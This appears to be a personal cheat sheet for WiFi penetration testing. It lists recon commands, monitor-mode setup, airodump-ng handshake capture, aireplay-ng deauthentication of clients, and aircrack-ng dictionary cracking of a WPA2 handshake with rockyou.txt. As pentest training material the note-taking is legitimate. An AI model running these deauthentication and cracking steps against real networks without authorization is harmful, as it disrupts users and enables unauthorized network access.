# Single Framework tool for conducting entire wifi Pentesting: https://github.com/D3Ext/WEF

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Wifi testing plan:

**Phase 1**: WPA2-Personal SSIDs (Easiest & Highest Success Rate)

**Phase 2**: WPA2-Enterprise SSIDs (Harder)

# --> windows cmd prompt commands ( Good for RECON & Intial Discovery ):

### 1) List saved Wi‑Fi profiles on your machine

$ netsh wlan show profiles

### 2) List all wireless networks in range, Shows SSIDs, signal strength, and BSSID (MAC address of each access point).

$ netsh wlan show networks mode=bssid

### 3) This command will give all the networks which are in wifi 4 interace. In my laptop i have wifi 2 and wifi 4. Some other may have wifi 6 also

$ netsh wlan show networks interface="Wi-Fi 4" mode=ssid

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Basic Requirements:

--> wifi adaptor
--> drives for tp-link wifi adaptor
--> kali vm

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# --> Kali terminal commands:

### 1) checking the connection

$ **iwconfig**

lo        no wireless extensions.

eth0      no wireless extensions.

wlan0     IEEE 802.11  ESSID:"Guest"
          Mode:Managed  Frequency:5.745 GHz  Access Point: 34:B8:83:67:EE:8E
          Bit Rate=162 Mb/s   Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          Link Quality=62/70  Signal level=-48 dBm
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:0   Missed beacon:0

Mode: **Managed** → this means it’s acting like a normal Wi‑Fi client (connected to Guest).

So the adapter is working, but it’s not yet in monitor mode (the mode needed for pentesting).

-------------------------------------------------------------------------------------------------------------------------------------------------------------

### 2) Switch to Monitor Mode

$ **sudo ip link set wlan0 down**

$ **sudo iwconfig wlan0 mode monitor**

$ **sudo ip link set wlan0 up**

$ **iwconfig**

lo        no wireless extensions.

eth0      no wireless extensions.

**wlan0**     IEEE 802.11  Mode:**Monitor**  Frequency:2.412 GHz  Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          

monitor mode on🔥🔥

-------------------------------------------------------------------------------------------------------------------------------------------------------------

### 3) Passive Discovery: recon

$ **sudo airodump-ng wlan0**

This will show:

**SSID** (network names), 
**BSSID** (AP MAC addresses),
**Channel**,
**Encryption type**,
**Clients connected**

-------------------------------------------------------------------------------------------------------------------------------------------------------------

### 4) Focus on One SSID and further 1 bssid in that ssid .

$ **sudo airodump-ng -c 64 --bssid 1c:fc:17:e5:29:66 -w guest_capture wlan0**

why this command:

**Evidence**: The -w $SSID option saves the capture into .cap and .csv files, which you can later analyze or include in your pentest report.

**Handshakes**: If the SSID uses WPA2‑PSK, this is how you capture the 4‑way handshake packets (needed for password strength testing).

**Client activity**: You can see which devices are connecting to that AP, their MAC addresses, and traffic counts.

-------------------------------------------------------------------------------------------------------------------------------------------------------------

## --> First attack : capture 4‑way handshakes and test password strength (dictionary/brute force)

### terminal 1: sudo airodump-ng -c 6 --bssid 20:f1:20:ba:ab:43 -w IT_Handshake wlan0

### terminal 2: sudo aireplay-ng -0 20 -a 34:b8:83:67:ee:8e wlan0

after capturing the request:

## bruteforce:

### $ sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt Guest_Handshake-01.cap


-------------------------------------------------------------------------------------------------------------------------------------------------------------

